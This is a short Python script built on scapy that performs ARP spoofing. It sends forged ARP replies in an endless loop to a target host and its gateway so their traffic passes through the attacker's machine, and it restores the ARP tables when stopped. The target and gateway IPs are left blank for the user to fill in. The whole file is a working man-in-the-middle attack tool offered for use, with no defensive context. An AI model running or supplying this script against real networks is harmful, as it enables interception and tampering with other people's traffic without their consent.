import scapy.all as scapy
import time

def getMac(ip):
	arpRequest = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	arpRequestBroadcast = broadcast / arpRequest
	answeredList = scapy.srp(arpRequestBroadcast, timeout = 5, verbose = False)[0]
	return answeredList[0][1].hwsrc

def spoof(targetIp, spoofIp):
	packet = scapy.ARP(op = 2, pdst = targetIp, hwdst = getMac(targetIp),psrc = spoofIp)
	scapy.send(packet, verbose = False)

def restore(destinationIp, sourceIp):
	destinationMac = getMac(destinationIp)
	sourceMac = getMac(sourceIp)
	packet = scapy.ARP(op = 2, pdst = destinationIp, hwdst = destinationMac, psrc = sourceIp, hwsrc = sourceMac)
	scapy.send(packet, verbose = False)
	
targetIp = '' # Enter your target IP
gatewayIp = '' # Enter your gateway's IP

try:
	sentPacketsCount = 0
	while True:
		spoof(targetIp, gatewayIp)
		spoof(gatewayIp, targetIp)
		sentPacketsCount = sentPacketsCount + 2
		print('\r [-] Packets Sent :' + str(sentPacketsCount), end ="")
		#time.sleep(2) # Waits for two seconds

except KeyboardInterrupt:
	print('\n Ctrl + C pressed.............Exiting')
	restore(gatewayIp, targetIp)
	restore(targetIp, gatewayIp)
	print('Arp Spoof Stopped.')
